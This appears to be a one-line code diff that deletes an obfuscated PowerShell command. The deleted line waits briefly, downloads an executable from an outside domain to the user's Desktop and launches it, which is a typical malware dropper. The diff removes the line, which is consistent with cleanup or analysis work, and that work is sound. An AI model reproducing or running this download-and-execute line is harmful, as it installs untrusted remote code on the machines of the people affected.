@@ -1,1 +1,0 @@
-$7d0mK6 = [TypE]'EnVIronMENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfolDeRPaTH('Desktop');(&'New-Object' 'System.Net.WebClient').doWnloAdfIlE.inVOKe('https://iniwarinta.date/ssynctime','$Des\3988357.exe');&'Start-Process' $Des\3988357.exe
